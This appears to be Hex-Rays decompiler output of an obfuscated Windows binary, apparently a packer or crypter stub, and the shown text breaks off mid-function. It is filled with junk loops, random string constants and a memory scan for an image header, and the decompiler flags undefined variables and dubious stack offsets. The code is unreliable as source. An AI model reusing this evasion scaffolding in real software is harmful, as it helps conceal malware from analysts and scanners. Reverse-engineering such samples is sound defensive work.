/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

int __stdcall sub_401000(int, int, int);
int __stdcall sub_40108C(int, int);
int __stdcall sub_4010E0(int, int, int);
int __fastcall sub_401330(int, int);
// int __usercall sub_4013AA@<eax>(int@<ebp>);
int sub_401778();
__int64 sub_4017D4();
unsigned int __stdcall sub_401818(int, int, int, int);
int __thiscall sub_401990(void *this, int, int, int (__stdcall *)(int, int, _DWORD));
int __stdcall sub_401B4C(int);
int sub_402544();
int __stdcall sub_402924(int);
__int64 __stdcall sub_402990(int, int, int);
int sub_402B34();
int __stdcall sub_402C20(int, int (__stdcall *)(int, _DWORD, int), int);
void *__thiscall sub_402F60(void *this);
int __fastcall sub_402FA4(int, int, int, int, int);
int sub_402FF0();
// void __usercall __noreturn start(int@<ebx>, int@<edi>, int@<esi>);
int __thiscall sub_404064(void *this, int, void (__stdcall *)(int, _DWORD, int), int);
int __stdcall sub_404138(int);
int __stdcall sub_4042E0(int, int);
int *__stdcall sub_404354(int, int);
int __stdcall sub_40445C(int);
__int64 sub_404578();
int __stdcall sub_40465C(int, int);
// void __usercall sub_404C01(int@<ebx>);
unsigned int sub_404CB5();
struct _LIST_ENTRY *sub_405021();
// void __usercall sub_405C64(unsigned int@<ecx>, void *@<edi>, const void *@<esi>);
_BYTE *__cdecl sub_405D8F(_BYTE *, _BYTE *);
char *__thiscall sub_40618A(void *this, int);
char *__cdecl sub_4061BD(int);
int __cdecl sub_40661F(int, int, unsigned __int8 *);
char __cdecl sub_406BA8(int, int, int);
// void __usercall sub_406E8A(int@<ebx>, int@<edi>);
unsigned int __cdecl sub_406F40(_BYTE *);
// void __usercall sub_408F6D(__int16 _DX@<dx>, int@<ebp>, _BYTE *@<edi>, int _ESI@<esi>, char@<efl>);
// void __usercall sub_40A86A(__int16 _AX@<ax>, _DWORD *_EDX@<edx>, int _ECX@<ecx>, unsigned int _EBX@<ebx>, int@<ebp>, int@<edi>, int@<esi>);
// void __usercall __noreturn sub_40AF54(int@<eax>, __int16 _DX@<dx>, int@<ecx>, _BYTE *@<edi>, _BYTE *@<esi>);
// __int64 __userpurge sub_40B376@<edx:eax>(int@<ebx>, int@<ebp>, int@<edi>, double@<st0>, char@<efl>, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int);
void sub_40B5E5();
// void __usercall sub_40B874(int@<eax>);
// int __userpurge sub_40CD0A@<eax>(_BYTE *@<eax>, int@<edx>, unsigned int _EBX@<ebx>, int@<ebp>, __int32 _EDI@<edi>, int@<esi>, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_40D979; // weak
char aU2pgh4ix2dfqUd[17] = "u2pgh4ix2dfq.ude"; // weak
char a09bvkklsz2gefu[43] = "09bvkklsz2gefu7gae6vor5xcb9,r y43iz235iqj."; // weak
char a9[2] = "9"; // weak
char asc_40EDAB[2] = " "; // weak
char a579w5e88c6teqn[24] = "5.7.9w5e8.8c6teqnxgl4cn"; // weak
char a7syhrucmatwlex[43] = "7syhrucmatwlex a46bgg3pgk eo,y7,4jnwzste7g"; // weak
char aG2kniiyAxs369p[39] = "g2kniiy axs369pda8c8fhq48enj30919er7,4"; // weak
char a0pvyytvko9jYp3[53] = "0pvyytvko9j yp3ct7d1n9 79nqon 1z,n,7ggh5z0 ugke9j2m6"; // weak
char a0vba2zyf[9] = "0vba2zyf"; // weak
char aB[2] = "b"; // weak
char a38309mbfjC8nrh[22] = "383,09mbfj c8nrhnhk x"; // weak
char a5wlx16jho4evkb[24] = " 5wlx16jho4evkbn,rf4m2j"; // weak
char aV2S22a[8] = "v2.s22a"; // weak
char aZ0o103oncisena[43] = "z0o103oncisena na9ktpyme1u.t8lxtcawfz2huhz"; // weak
char aDy[3] = "dy"; // weak
char aYqbtro8wx03Xp0[24] = "yqbtro8wx03 xp0ukhznbs,"; // weak
char aQ[2] = "q"; // weak
char aK59dj[6] = "k59dj"; // weak
char aUdmebygU56b550[37] = "udmebyg u56b550p7qtebai uznm4qgj4,t7"; // weak
char a5[2] = "5"; // weak
char a9Uk38ivsec45xj[39] = "9 uk38ivsec45xjq,ozrqmre9ynt5h.a01,lbj"; // weak
char aFzvmkrbx[9] = "fzvmkrbx"; // weak
char a79g78qgw[9] = "79g78qgw"; // weak
char a4pLikr46kzc[14] = "4p.likr4,6kzc"; // weak
char a3g8[4] = "3g8"; // weak
char a7cxyp033vv46al[57] = "7cxyp033vv46al6,kabr1m7s,8gt8ructtvex43pi3bhzcz42p.460cx"; // weak
char asc_40EFC5[2] = "f"; // weak
char a7CRcw96k4qUTr6[22] = "7 c rcw96k4q.u tr64ko"; // weak
char a7qDh[6] = "7q dh"; // weak
char aK8zua9qi3Ks7nF[53] = "k8zua9qi3,ks7n,f734oc,im3saa46z6 g0nlnz4nf0 r3ki6vk7"; // weak
char aQ_0[2] = "q"; // weak
char a89xewd0zQo47cz[39] = "89xewd0z qo47czqytyjfw.3omonpjw.o o1tp"; // weak
char aZbxl9[6] = "zbxl9"; // weak
char aEsha5whxJl1iah[43] = "esha5whx.jl1iah906qiqezr0wp19i2409zk rxzug"; // weak
char a36ov2pdh6b3uGx[37] = "36ov2pdh6b,3u gxibqx7rzary9 ylmiekmz"; // weak
char aO3c1c147ef7jAx[25] = "o 3c1c147ef7j axlmbk42td"; // weak
char aTdsi4MNjimf3ki[21] = "tdsi4,m.njimf3kijacc"; // weak
char aR[2] = "r"; // weak
char aLa0cejvub6sy6K[35] = "la0cejvub6sy6 kuh,q4p4kwwjptsv9l, "; // weak
char a7xzwagnyqt5Jbq[41] = "7xzwagnyqt5.jbq.h,qp2g1jv6xzw13kfpo.q4f."; // weak
char aVbj8Na9fdrl326[26] = "vbj8.na9fdrl326iftryiab 6"; // weak
char aRtvxxisuofj1tY[33] = "rtvxxisuofj,1t..ypqj8 y6s26q1 7w"; // weak
char aENIc7uvujh5i9n[39] = "e.n ic7uvujh5i9n5l2dx6qaemkrnt2 05.,,m"; // weak
char aD[2] = "d"; // weak
char a3gf1r6b5knlqdm[53] = "3gf1r6b,5knlqdma78loe5.fx.fvlwsa2vct4vywy7ak2ao2 1b "; // weak
char aXY4[6] = ",x y4"; // weak
char aGiBtuwq2z[11] = "gi btuwq2z"; // weak
char a57v76fxsk798ch[29] = " 57v76fxsk798ch6.3k4w4rmnpx."; // weak
_UNKNOWN unk_4239D4; // weak
int dword_443020 = 521288629; // weak
int dword_443030 = -1281207539; // weak
int dword_443034 = 362436069; // weak
int dword_443038 = 251250; // weak
int dword_443044 = 395947643; // weak
int dword_44305C = 275105318; // weak
int dword_443068 = 793672544; // weak
int dword_44307C = -249350552; // weak
int dword_443084 = -1614442047; // weak
int dword_44308C = 1269593455; // weak
int dword_4430A4 = 88675123; // weak
int dword_4430A8 = -1345472342; // weak
int dword_4430B4 = 1234110931; // weak
int dword_4430CC = -1713936887; // weak
int dword_4430D8 = -1296645383; // weak
int dword_4430DC = 270838611; // weak
int dword_443100 = 0; // weak
int dword_443104 = 0; // weak
int dword_443118 = 0; // weak
int dword_44312C = 0; // weak
int dword_443138 = 0; // weak
int dword_44313C = 0; // weak
int dword_443140 = 0; // weak
int dword_443144 = 0; // weak
int dword_443148 = 0; // weak
int dword_443154 = 0; // weak
int dword_443160 = 0; // weak
int dword_443164 = 0; // weak
int dword_443168 = 0; // weak
int dword_443178 = 0; // weak
int dword_443184 = 0; // weak
int dword_443188 = 0; // weak
int dword_443194 = 0; // weak
int dword_4431A4 = 0; // weak
int dword_4431AC = 0; // weak
int dword_4431B0 = 0; // weak
int dword_4431B4 = 0; // weak
char byte_4431B8 = '\0'; // weak
int dword_4431C8 = 0; // weak
int dword_4431D8 = 0; // weak
int dword_4431DC = 0; // weak
int dword_4431E4 = 0; // weak
int dword_4431EC = 0; // weak
int dword_4431F8 = 0; // weak
int dword_4431FC = 0; // weak
int dword_443228; // weak
int dword_44322C; // weak
int dword_443230; // weak
// extern ATOM (__stdcall *AddAtomA)(LPCSTR lpString);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern DWORD (__stdcall *GetCurrentThreadId)();
// extern DWORD (__stdcall *GetLastError)();
// extern HANDLE (__stdcall *GetProcessHeap)();
// extern HANDLE (__stdcall *GetStdHandle)(DWORD nStdHandle);
// extern DWORD (__stdcall *GetTickCount)();


//----- (00401000) --------------------------------------------------------
int __stdcall sub_401000(int a1, int a2, int a3)
{
  int k; // [esp+0h] [ebp-50h]
  int j; // [esp+Ch] [ebp-44h]
  int i; // [esp+14h] [ebp-3Ch]

  for ( i = 0; i <= 4; ++i )
    ;
  for ( j = 0; j <= 3; ++j )
    ;
  for ( k = 0; k <= 1; ++k )
    ;
  return 0;
}

//----- (0040108C) --------------------------------------------------------
int __stdcall sub_40108C(int a1, int a2)
{
  int result; // eax
  int j; // [esp+Ch] [ebp-34h]
  int i; // [esp+14h] [ebp-2Ch]

  result = 20557;
  for ( i = 0; i <= 4; ++i )
  {
    for ( j = 0; j <= 2; ++j )
      ;
  }
  return result;
}

//----- (004010E0) --------------------------------------------------------
int __stdcall sub_4010E0(int a1, int a2, int a3)
{
  int i; // [esp+48h] [ebp-3Ch]

  for ( i = 0; i <= 5; ++i )
    ;
  return -5716;
}
// 401243: conditional instruction was optimized away because %var_18.4==92D0
// 401279: conditional instruction was optimized away because %var_8.4==EE21AB80

//----- (00401330) --------------------------------------------------------
int __fastcall sub_401330(int a1, int a2)
{
  int v2; // edx
  int v3; // ecx
  int i; // [esp+94h] [ebp-14h]
  int savedregs; // [esp+A8h] [ebp+0h] BYREF

  sub_402FA4(a1, a2, 52, 17, 17);
  for ( i = 0; i <= 1; ++i )
    sub_40108C(0, 52);
  sub_402FA4(v3, v2, 52, 17, 17);
  sub_404578();
  sub_4013AA((int)&savedregs);
  sub_40108C(62455, 62455);
  return sub_4013AA((int)&savedregs);
}
// 401389: variable 'v3' is possibly undefined
// 401389: variable 'v2' is possibly undefined

//----- (004013AA) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_4013AA@<eax>(int a1@<ebp>)
{
  unsigned int v1; // edx
  int v2; // ecx
  int v3; // eax
  unsigned int v4; // ecx
  bool v5; // cf
  bool v6; // cf
  unsigned int v7; // ett
  int v8; // eax
  int v9; // ecx
  int v10; // edx
  int v11; // ecx
  unsigned int v12; // edx
  int v13; // ecx
  int v14; // edx
  int v15; // ecx
  unsigned int v16; // eax
  int v17; // edx
  int *v18; // eax
  int v19; // ecx
  int v21; // [esp-Ch] [ebp-Ch]

  *(_DWORD *)(a1 - 40) = 0;
  do
  {
    *(_DWORD *)(a1 - 36) = 73;
    if ( *(_DWORD *)(a1 - 36) == 357 )
    {
      *(_DWORD *)(a1 - 60) = 0;
      do
      {
        *(_DWORD *)(a1 - 56) = 2440;
        *(_DWORD *)(a1 - 72) = a1 - 56;
        *(_DWORD *)(a1 - 76) = a1 - 36;
        v1 = *(_DWORD *)(a1 - 76);
        v2 = *(_DWORD *)v1 & 0xED9;
        v3 = **(_DWORD **)(a1 - 72) - v2;
        *(_DWORD *)(a1 - 48) = v3;
        v4 = v2 & 0xF1DD;
        *(_DWORD *)(a1 - 48) -= v3;
        *(_DWORD *)(a1 - 52) -= v1;
        v5 = 0;
        if ( v1 )
        {
          *(_DWORD *)(a1 - 64) ^= v4;
          v1 -= *(_DWORD *)(a1 - 36);
          v6 = 0;
          if ( (v1 & v3) == 0 )
          {
            *(_DWORD *)(a1 - 48) ^= 0xF6u;
            v6 = v4 < 0x172;
            v4 -= 370;
          }
          v7 = v6 + v3;
          v5 = v4 < v7;
          v4 -= v7;
        }
        *(_DWORD *)(a1 - 52) += v1 + (__CFADD__(v5, v4) | __CFADD__(*(_DWORD *)(a1 - 48), v5 + v4));
        v8 = sub_402924(*(_DWORD *)(a1 - 56));
        v10 = 0;
        if ( v8 >= *(_DWORD *)(a1 - 44) )
        {
          v10 = 13273;
          v8 -= v9;
        }
        *(_DWORD *)(a1 - 36) -= v10;
        v11 = v9 + 17385;
        ++*(_DWORD *)(a1 - 60);
      }
      while ( *(int *)(a1 - 60) <= 4 );
      *(_DWORD *)(a1 - 52) = 36197;
      if ( *(_DWORD *)(a1 - 52) != 30 )
      {
        v12 = *(_DWORD *)(a1 - 52) + v11 + v10;
        if ( v11 != v12 || (v8 |= 0x8Fu, v12 <= *(_DWORD *)(a1 - 84)) )
        {
          *(_DWORD *)(a1 - 80) += 44538;
          *(_DWORD *)(a1 - 44) ^= 0x185u;
        }
        *(_DWORD *)(a1 - 52) -= v8;
        sub_402B34();
        *(_DWORD *)(a1 - 48) &= 0x41u;
        *(_DWORD *)(a1 - 48) += v13;
        *(_DWORD *)(a1 - 84) = 39096;
        sub_402B34();
        *(_DWORD *)(a1 - 36) ^= sub_40445C(*(_DWORD *)(a1 - 84));
      }
      *(_DWORD *)(a1 - 44) = *(_DWORD *)(a1 - 36) * (*(_DWORD *)(a1 - 52) & *(_DWORD *)(a1 - 36));
    }
    else
    {
      *(_DWORD *)(a1 - 44) = 0;
      sub_404138(*(_DWORD *)(a1 - 44));
    }
    *(_DWORD *)(a1 - 44) = 3234;
    if ( *(int *)(a1 - 44) <= 162 )
    {
      if ( *(_DWORD *)(a1 - 44) == 49 )
      {
        sub_404354((int)a79g78qgw, *(_DWORD *)(a1 - 36));
        *(_DWORD *)(a1 - 36) -= (v14 ^ v15) + v14;
      }
      else
      {
        *(_DWORD *)(a1 - 92) = 90;
        sub_40445C(*(_DWORD *)(a1 - 92));
        *(_DWORD *)(a1 - 92) ^= 0xBEu;
        *(_DWORD *)(a1 - 92) = *(_DWORD *)(a1 - 92);
        GetProcessHeap();
        *(_DWORD *)(a1 - 36) += 135;
      }
      if ( *(int *)(a1 - 36) <= 63594 )
      {
        GetStdHandle(0xFFFFFFF4);
        *(_DWORD *)(a1 - 108) = *(_DWORD *)(a1 - 108);
        v16 = 2 * sub_40108C((int)a9, (int)aK59dj);
        *(_DWORD *)(a1 - 108) += v16;
        *(_DWORD *)(a1 - 36) ^= 0x7Bu;
        if ( v16 <= *(_DWORD *)(a1 - 104) )
          *(_DWORD *)(a1 - 104) += v17;
        *(_DWORD *)(a1 - 108) = 1009;
        sub_40108C((int)aD, (int)aZbxl9);
        v18 = sub_404354(*(_DWORD *)(a1 - 108), *(_DWORD *)(a1 - 108));
        *(_DWORD *)(a1 - 100) = *(_DWORD *)(a1 - 100);
        *(_DWORD *)(a1 - 36) -= (char *)v18 + v19;
      }
    }
    *(_DWORD *)(a1 - 112) = 0;
    do
    {
      GetCurrentThreadId();
      *(_DWORD *)(a1 - 116) = 0;
      *(_DWORD *)(a1 - 124) = 0;
      *(_DWORD *)(a1 - 116) += *(_DWORD *)(a1 - 116) / (*(_DWORD *)(a1 - 124) + 1);
      ++*(_DWORD *)(a1 - 112);
    }
    while ( *(int *)(a1 - 112) <= 5 );
    ++*(_DWORD *)(a1 - 40);
  }
  while ( *(int *)(a1 - 40) <= 2 );
  *(_DWORD *)(a1 - 4) = v21;
  *(_DWORD *)(a1 - 128) = 10961;
  *(_DWORD *)(a1 - 132) = 42468;
  *(_DWORD *)(a1 - 128) -= *(_DWORD *)(a1 - 128) / (*(_DWORD *)(a1 - 132) + 1);
  if ( *(_DWORD *)(a1 - 128) == 56188 )
  {
    sub_4010E0(*(_DWORD *)(a1 - 132), (int)a7CRcw96k4qUTr6, (int)aU2pgh4ix2dfqUd);
    if ( *(int *)(a1 - 128) <= 30754 )
    {
      *(_DWORD *)(a1 - 148) = 0;
      do
      {
        *(_DWORD *)(a1 - 144) = 59675;
        sub_40465C((int)aR, *(_DWORD *)(a1 - 144));
        *(_DWORD *)(a1 - 132) += 46;
        *(_DWORD *)(a1 - 136) = 126;
        sub_40465C((int)aQ, *(_DWORD *)(a1 - 144));
        sub_401000(*(_DWORD *)(a1 - 128), *(_DWORD *)(a1 - 136), *(_DWORD *)(a1 - 132));
        ++*(_DWORD *)(a1 - 148);
      }
      while ( *(int *)(a1 - 148) <= 4 );
      *(_DWORD *)(a1 - 144) = 12484;
      *(_DWORD *)(a1 - 160) = a1 - 144;
      *(_DWORD *)(a1 - 136) = 56366;
      *(_DWORD *)(a1 - 144) -= **(_DWORD **)(a1 - 160) / (*(_DWORD *)(a1 - 128) + 1);
    }
  }
  else
  {
    sub_401000(*(_DWORD *)(a1 - 128), (int)a7xzwagnyqt5Jbq, *(_DWORD *)(a1 - 132));
  }
  for ( *(_DWORD *)(a1 - 4) &= 0xFFFFF000; *(_WORD *)(*(_DWORD *)(a1 - 4) + 1) != 20570; *(_DWORD *)(a1 - 4) -= 4096 )
    ;
  return *(_DWORD *)(a1 - 4);
}
// 401777: positive sp value C has been found
// 4013AA: could not find valid save-restore pair for ebx
// 401436: variable 'v9' is possibly undefined
// 40148F: variable 'v13' is possibly undefined
// 40154A: variable 'v14' is possibly undefined
// 40154A: variable 'v15' is possibly undefined
// 40158E: variable 'v17' is possibly undefined
// 4015BD: variable 'v19' is possibly undefined
// 401606: variable 'v21' is possibly undefined

//----- (00401778) --------------------------------------------------------
int sub_401778()
{
  sub_404354(2230, 2499);
  return 0;
}

//----- (004017D4) --------------------------------------------------------
__int64 sub_4017D4()
{
  int i; // [esp+4h] [ebp-2Ch]

  for ( i = 0; i <= 4; ++i )
    ;
  return 62289i64;
}

//----- (00401818) --------------------------------------------------------
// local variable allocation has failed, the output may be wrong!
unsigned int __stdcall sub_401818(int a1, int a2, int a3, int a4)
{
  int v4; // ecx
  unsigned int *v5; // eax
  unsigned int v6; // eax
  int v7; // ecx
  int n; // [esp+0h] [ebp-60h]
  int m; // [esp+4h] [ebp-5Ch]
  int k; // [esp+10h] [ebp-50h]
  int j; // [esp+14h] [ebp-4Ch]
  int i; // [esp+1Ch] [ebp-44h]
  unsigned int v14; // [esp+38h] [ebp-28h]
  int v15; // [esp+44h] [ebp-1Ch] BYREF
  int v16; // [esp+48h] [ebp-18h]
  int v17; // [esp+4Ch] [ebp-14h]
  int v18; // [esp+50h] [ebp-10h]
  int v19; // [esp+54h] [ebp-Ch]
  int v20; // [esp+58h] [ebp-8h]
  int v21; // [esp+5Ch] [ebp-4h]
  int v22; // [esp+6Ch] [ebp+Ch]

  v19 = 0;
  v17 = 26488;
  v15 = 83152;
  v16 = 54;
  v22 = 3332;
  v20 = 3332;
  v21 = 201;
  v18 = 41885;
  for ( i = 0; i <= 3; ++i )
  {
    for ( j = 0; j <= 1; ++j )
    {
      for ( k = 0; k <= 4; ++k )
      {
        v16 = 1687;
        v15 = 2911;
        v4 = 4910857;
        v5 = &STACK[0x4AEF51];
        v21 |= (unsigned int)&STACK[0x4AEF51];
        if ( (v14 & 0x88F) == 0 )
        {
          v14 = (((unsigned int)&STACK[0x4AEF51] | 0x4AEF0900000000i64) + __PAIR64__(v14, &STACK[0x4AEF51])) >> 32;
          if ( v19 >= (int)&v15 )
            v4 = (int)&STACK[0x4AEF4D];
          v5 = (unsigned int *)((char *)&STACK[0x4AEF51] + (_DWORD)&STACK[0x4AEF51] + v4);
        }
        v22 += (int)v5;
      }
    }
  }
  for ( m = 0; m <= 5; ++m )
  {
    v16 = 9;
    v6 = v21 & 9;
    v7 = v6 * (v20 & 0x345);
    v19 -= v7;
    for ( n = 0; n <= 4; ++n )
      ;
  }
  if ( !(2 * v7) )
    v6 = (__PAIR64__(v6, 4896632) + 6084) >> 32;
  return v6 - v22;
}
// 4018F7: exceedingly huge offset into the stack frame
// 4018F9: exceedingly huge offset into the stack frame
// 401907: exceedingly huge offset into the stack frame
// 40190F: exceedingly huge offset into the stack frame

//----- (00401990) --------------------------------------------------------
int __thiscall sub_401990(void *this, int a2, int a3, int (__stdcall *a4)(int, int, _DWORD))
{
  int v4; // edx
  int v5; // ecx
  int v7; // [esp+4Ch] [ebp+8h]

  sub_402F60(this);
  sub_40108C(60657, 17755);
  dword_4430CC = sub_402544();
  v7 = a2 - 1;
  if ( v7 )
    return a4(v7, a3, a4);
  sub_402FA4(v5, v4, 81, 81, 81);
  sub_40445C(13);
  sub_40445C(13);
  sub_402B34();
  return 0;
}
// 4019D9: conditional instruction was optimized away because %var_10.4==ECF1
// 401B04: variable 'v5' is possibly undefined
// 401B04: variable 'v4' is possibly undefined
// 4430CC: using guessed type int dword_4430CC;

//----- (00401B4C) --------------------------------------------------------
int __stdcall sub_401B4C(int a1)
{
  void *v1; // ecx
  int v2; // ecx
  int v3; // edx
  int v4; // ecx
  void *v5; // ecx
  void *v6; // ecx
  int v7; // edx
  int v8; // ecx
  int v9; // edx
  int v10; // ecx
  int v11; // edx
  int v12; // ecx
  int v13; // edx
  unsigned __int64 v14; // kr00_8
  int v15; // ecx
  int v16; // eax
  int v17; // ecx
  int v18; // eax
  int v19; // edx
  int v20; // ecx
  int i3; // [esp+10h] [ebp-1A8h]
  int i2; // [esp+24h] [ebp-194h]
  int v24; // [esp+2Ch] [ebp-18Ch] BYREF
  int v25; // [esp+30h] [ebp-188h]
  int *v26; // [esp+3Ch] [ebp-17Ch]
  int i1; // [esp+48h] [ebp-170h]
  int v28; // [esp+4Ch] [ebp-16Ch]
  int v29[2]; // [esp+58h] [ebp-160h] BYREF
  int v30[7]; // [esp+84h] [ebp-134h] BYREF
  int v31; // [esp+A0h] [ebp-118h]
  int nn; // [esp+A4h] [ebp-114h]
  int v33; // [esp+A8h] [ebp-110h]
  unsigned int v34; // [esp+B4h] [ebp-104h]
  int v35; // [esp+BCh] [ebp-FCh]
  int mm; // [esp+C0h] [ebp-F8h]
  int kk; // [esp+C8h] [ebp-F0h]
  unsigned int v38; // [esp+CCh] [ebp-ECh] BYREF
  int v39; // [esp+D4h] [ebp-E4h]
  int jj; // [esp+F0h] [ebp-C8h]
  int v41; // [esp+F4h] [ebp-C4h]
  int v42; // [esp+FCh] [ebp-BCh]
  int ii; // [esp+100h] [ebp-B8h]
  int v44; // [esp+104h] [ebp-B4h]
  int v45; // [esp+108h] [ebp-B0h]
  int n; // [esp+10Ch] [ebp-ACh]
  int v47; // [esp+11Ch] [ebp-9Ch]
  int m; // [esp+124h] [ebp-94h]
  int v49; // [esp+128h] [ebp-90h]
  int v50; // [esp+12Ch] [ebp-8Ch]
  int v51; // [esp+130h] [ebp-88h]
  int v52; // [esp+138h] [ebp-80h]
  int v53; // [esp+14Ch] [ebp-6Ch]
  int v54; // [esp+150h] [ebp-68h]
  int k; // [esp+154h] [ebp-64h]
  int *v56; // [esp+158h] [ebp-60h]
  int *v57; // [esp+15Ch] [ebp-5Ch]
  int v58; // [esp+160h] [ebp-58h]
  int v59[5]; // [esp+164h] [ebp-54h] BYREF
  int v60; // [esp+178h] [ebp-40h] BYREF
  int v61; // [esp+17Ch] [ebp-3Ch]
  int j; // [esp+180h] [ebp-38h]
  int v63; // [esp+184h] [ebp-34h] BYREF
  int v64; // [esp+188h] [ebp-30h]
  int v65; // [esp+18Ch] [ebp-2Ch]
  int i; // [esp+1A0h] [ebp-18h]
  int *v67; // [esp+1A4h] [ebp-14h]
  int *v68; // [esp+1A8h] [ebp-10h]
  int v69; // [esp+1ACh] [ebp-Ch] BYREF
  int v70[2]; // [esp+1B0h] [ebp-8h] BYREF

  v70[0] = 53673;
  sub_404138(53673);
  v69 = 0;
  v68 = v70;
  v67 = &v69;
  v70[1] = 0;
  for ( i = 0; i <= 2; ++i )
  {
    v1 = (void *)(v70[0] + 1);
    v70[0] *= v70[0] / (v70[0] + 1);
    if ( v69 < 5165 )
      sub_402F60(v1);
    sub_4017D4();
  }
  for ( j = 0; j <= 4; ++j )
  {
    v63 = 0;
    v60 = 42770;
    v61 = 0;
    sub_4017D4();
    v61 |= v2 - v63;
    v59[2] = (int)&v63;
    v64 = 0;
    v61 -= v60 | v63;
    v63 ^= (unsigned int)&v63;
    if ( v63 < 45793 )
    {
      v58 = 0;
      v59[0] = 25272;
      v57 = v59;
      v65 = -656;
      v64 = 22846;
      v56 = &v60;
      sub_40445C(25272);
    }
    else
    {
      GetCurrentThreadId();
      v64 = 0;
      sub_40108C((int)aGiBtuwq2z, 0);
    }
    sub_402FA4(v4, v3, v63, (int)aTdsi4MNjimf3ki, (int)aEsha5whxJl1iah);
  }
  for ( k = 0; k <= 3; ++k )
  {
    v53 = 3450;
    v64 = 87;
    v54 = 3363;
    sub_402F60(v5);
    v65 = 19;
    sub_402F60(v6);
    sub_401000(v64, (int)a57v76fxsk798ch, v65);
  }
  v63 = 52;
  sub_40445C(52);
  sub_4017D4();
  sub_4017D4();
  sub_402924((int)aRtvxxisuofj1tY);
  sub_404578();
  for ( m = 0; m <= 3; ++m )
  {
    v47 = 141;
    sub_4010E0(141, 14438, (int)a579w5e88c6teqn);
    sub_4010E0(141, 14438, (int)a5wlx16jho4evkb);
    sub_402FA4(v8, v7, 14438, 14438, 14438);
    sub_4010E0(141, 14438, (int)aYqbtro8wx03Xp0);
    sub_402FA4(v10, v9, 14438, 14438, 14438);
    sub_4017D4();
  }
  v51 = 830;
  sub_401818(60, 830, 60, (int)a89xewd0zQo47cz);
  v49 = 112;
  for ( n = 0; n <= 3; ++n )
  {
    v50 = 43351;
    sub_402924(43351);
  }
  v44 = 15835;
  sub_402FA4(v12, v11, 15835, 15835, 15835);
  for ( ii = 0; ii < a1; ++ii )
  {
    v42 = 1913524408;
    v52 = sub_402544();
    for ( jj = 0; jj <= 3; ++jj )
      v41 = 13651919;
    if ( v52 != 7 )
    {
      v39 = 25;
      for ( kk = 0; kk <= 4; ++kk )
        ;
      for ( mm = 0; mm <= 3; ++mm )
      {
        v38 = 0;
        v35 = 0;
        v33 -= 144;
        v13 = 0;
        v14 = __PAIR64__(v34, v39) - 9707;
        v34 = (__PAIR64__(v34, v39) - 9707) >> 32;
        v39 = v14;
      }
      v15 = 0;
      for ( nn = 0; nn <= 1; ++nn )
      {
        v38 = 8518;
        v16 = 8518;
        if ( v39 != 8518 )
        {
          v31 ^= v13;
          v39 += 197;
          v39 -= 1212;
          v38 -= 8518;
          v17 = (__PAIR64__(v15, v39) - __PAIR64__(v38, 0)) >> 32;
          v38 -= v17;
          if ( v17 >= v31 )
          {
            v17 = v39;
            v16 = 8518 - v13;
          }
          v15 = v13 & v17;
          v13 = v13 + 103 - v16;
        }
        if ( v39 > 117 )
        {
          v19 = v39 + v13;
          v20 = v19 + v39 + v38 + v15;
          v13 = v19 - v38;
          if ( v16 != v38 )
          {
            v13 -= 109;
            if ( (v38 & 0x486) == 0 )
              v39 |= 0x12A2u;
          }
          v15 = v39 ^ v20;
        }
        else
        {
          v30[5] = (int)&v38;
          v18 = 2 * v38;
          v38 = -v38;
          v13 = -158;
          if ( v18 == -158 )
          {
            v13 = (int)&v24 + 2;
            if ( (unsigned int)&v38 >= 0x9E || (unsigned int)&v38 < 0x9E )
              v13 = (char *)&v24 + 2 - ((char *)&v38 + __CFADD__(&v38, -158));
            v38 += __CFADD__(&v38, -158);
          }
          v15 = 0;
        }
      }
    }
    v30[1] = 37971;
    v30[2] = 0;
    v30[0] = 23989;
    v29[1] = (int)v30;
  }
  v45 = -447521167;
  v29[0] = 130;
  for ( i1 = 0; i1 <= 3; ++i1 )
  {
    v26 = v29;
    v28 = 0;
  }
  HIWORD(v24) = 0;
  v25 = 185;
  sub_40465C(63256, 185);
  for ( i2 = 0; i2 <= 3; ++i2 )
  {
    for ( i3 = 0; i3 <= 3; ++i3 )
    {
      sub_40445C(12418);
      sub_40445C(12418);
      sub_40108C((int)a7cxyp033vv46al, v25);
    }
  }
  v52 = sub_4042E0(v52, v45);
  sub_40445C(207);
  sub_40445C(207);
  sub_4017D4();
  return v52;
}
// 401BB2: conditional instruction was optimized away because %var_C.4>=142D
// 401C7E: conditional instruction was optimized away because %var_34.4==0
// 401CC2: variable 'v2' is possibly undefined
// 401D9F: variable 'v4' is possibly undefined
// 401D9F: variable 'v3' is possibly undefined
// 401DCD: variable 'v5' is possibly undefined
// 401DD9: variable 'v6' is possibly undefined
// 401E79: variable 'v8' is possibly undefined
// 401E79: variable 'v7' is possibly undefined
// 401EA6: variable 'v10' is possibly undefined
// 401EA6: variable 'v9' is possibly undefined
// 401FC0: variable 'v12' is possibly undefined
// 401FC0: variable 'v11' is possibly undefined

//----- (00402544) --------------------------------------------------------
int sub_402544()
{
  int v0; // ecx
  unsigned int v1; // edx
  int v2; // eax
  int v3; // ecx
  int v4; // edx
  bool v5; // cf
  __int64 v6; // rax
  int v7; // ecx
  unsigned int v8; // et0
  int jj; // [esp+14h] [ebp-104h]
  int ii; // [esp+80h] [ebp-98h]
  int n; // [esp+A8h] [ebp-70h]
  int v13; // [esp+ACh] [ebp-6Ch]
  int m; // [esp+B0h] [ebp-68h]
  unsigned int v15; // [esp+B8h] [ebp-60h]
  unsigned int v16; // [esp+D4h] [ebp-44h]
  int k; // [esp+D8h] [ebp-40h]
  int v18; // [esp+DCh] [ebp-3Ch]
  int v19; // [esp+E4h] [ebp-34h]
  int j; // [esp+ECh] [ebp-2Ch]
  unsigned int v21; // [esp+104h] [ebp-14h]
  int i; // [esp+10Ch] [ebp-Ch]

  for ( i = 0; i <= 1; ++i )
    ;
  for ( j = 0; j <= 1; ++j )
  {
    v0 = 249;
